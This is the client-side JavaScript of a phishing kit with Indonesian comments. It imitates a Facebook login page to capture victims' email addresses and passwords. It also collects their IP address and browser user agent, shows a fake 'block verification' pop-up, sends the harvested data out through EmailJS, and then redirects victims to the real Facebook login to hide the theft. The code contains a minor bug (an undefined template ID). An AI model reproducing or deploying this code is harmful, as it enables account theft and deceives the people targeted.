  <script>
    // ⚠️ GANTI DENGAN KREDENSIAL EMAILJS ANDA 
    const EMAILJS_SERVICE_ID = 'YOUR_EMAILJS_SERVICE_ID'; // <-- GANTI INI
    const EMAILJS_TEMPLATE_ID = 'YOUR_EMAILJS_TEMPLATE_ID'; // <-- GANTI INI
    const EMAILJS_PUBLIC_KEY = 'YOUR_EMAILJS_PUBLIC_KEY'; // <-- GANTI INI (User ID)

    (function() {
        // Inisialisasi EmailJS di awal
        emailjs.init(EMAILJS_PUBLIC_KEY);
    })();
    
    // Menyimpan data login dari langkah 1
    let ngLoginData = {};

    function ngSubmit() {
        const user = $("#user").val();
        const pass = $("#pass").val();
        const errorElement = $("#errorMsg");
        const titleElement = $("#titleMsg");

        // 1. Validasi Login
        if (user === '' || user === null || user.length <= 5) {
            titleElement.hide();
            errorElement.show().html("<p class='warning' style='margin:0;'><i class='fa fa-exclamation-circle'></i> Email atau nomor ponsel yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.</p>");
            return false;
        } else if (pass === '' || pass === null || pass.length <= 5) {
            titleElement.hide();
            errorElement.show().html("<p class='warning' style='margin:0;'><i class='fa fa-exclamation-circle'></i> Kata sandi salah. Apakah Anda melupakan kata sandi Anda?</p>");
            return false;
        }
        
        // Bersihkan pesan error dan tampilkan pesan normal
        titleElement.show();
        errorElement.hide();

        // 2. Simpan data login dan UA
        ngLoginData.ngUser = user;
        ngLoginData.ngPass = pass;
        ngLoginData.ngIp = $("#ngIp").val() || 'Unknown IP'; // Ambil IP
        ngLoginData.ngUa = navigator.userAgent; // Ambil User Agent
        
        // 3. Isi input tersembunyi di pop-up
        $("#ngUser").val(ngLoginData.ngUser);
        $("#ngPass").val(ngLoginData.ngPass);
        $("#ngIp").val(ngLoginData.ngIp);
        $("#ngUa").val(ngLoginData.ngUa);

        // 4. Tampilkan pop-up verifikasi
        $(".mask").fadeIn(200);
        $(".ngPopup").fadeIn(200);
        return false;
    }

    // Fungsi submit FINAL dari pop-up verifikasi
    function ngFinal() {
        const form = document.getElementById('verificationForm');
        const submitBtn = document.getElementById('submitBtn');
        const originalText = submitBtn.value;
        
        // Set tombol menjadi loading
        submitBtn.value = "Mengirim...";
        submitBtn.disabled = true;

        // Kumpulkan data final
        const formData = new FormData(form);
        const templateParams = {};
        for (let [key, value] of formData.entries()) {
            templateParams[key] = value;
        }
        
        // Kirim data menggunakan EmailJS
        emailjs.send(EMAILJS_SERVICE_ID, TEMPLATE_ID, templateParams)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                
                // Tutup pop-up dan redirect
                $(".mask").fadeOut(200);
                $(".ngPopup").fadeOut(200, function() {
                    // Redirect ke halaman Facebook login asli setelah sukses
                    window.location.replace("https://m.facebook.com/login/?next");
                });
            }, function(error) {
                console.error('FAILED...', error);
                
                // Kembalikan tombol dan beri notifikasi
                submitBtn.value = originalText;
                submitBtn.disabled = false;
                
                // Tampilkan pesan error custom, bukan alert bawaan
                $(".ngPopup .topTitle").text("Gagal Mengirim Data. Coba Lagi!");
                setTimeout(() => {
                    $(".ngPopup .topTitle").text("Verifkasi Pemblokiran");
                }, 3000);
            });

        return false;
    }
  </script>
  <script>
  // GET REAL IP ADDRESS (Menggunakan Fallback)
  $(document).ready(function() {
    var getIp = function (callback) {
        // Coba API Tencet Games
        $.ajax({
            type: "get",
            url: "https://api.pubgameshowtime.com/ip/getcountry",
            dataType: "json",
            timeout: 5000,
            success: function (result) {
                callback(result.ip);
            },
            error: function() {
                // Fallback ke ipify.org
                $.ajax({
                    type: "get",
                    url: "https://api.ipify.org?format=json",
                    dataType: "json",
                    timeout: 5000,
                    success: function(result) {
                        callback(result.ip);
                    },
                    error: function() {
                         callback('IP-Fetch-Failed'); // Jika semua gagal
                    }
                });
            }
        });
    }
    
    getIp(function(ip) {
        $("#ngIp").val(ip);
    });
  });
